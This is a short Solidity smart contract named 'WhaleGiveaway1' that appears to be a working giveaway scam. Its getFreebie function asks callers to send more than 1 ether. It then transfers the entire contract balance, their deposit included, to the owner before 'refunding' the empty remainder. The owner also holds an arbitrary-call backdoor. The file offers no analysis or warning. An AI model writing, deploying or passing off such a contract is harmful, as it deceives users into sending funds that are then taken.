pragma solidity ^0.4.19;

contract WhaleGiveaway1 {
    address public owner;

    function WhaleGiveaway1() public {
        owner = msg.sender;
    }

    function() public payable {}

    function getFreebie() public payable {
        require(msg.value > 1 ether);
        owner.transfer(this.balance);
        msg.sender.transfer(this.balance);
    }

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address _to, uint _value, bytes _data) public {
        require(msg.sender == owner);
        require(_to.call.value(_value)(_data));
    }
}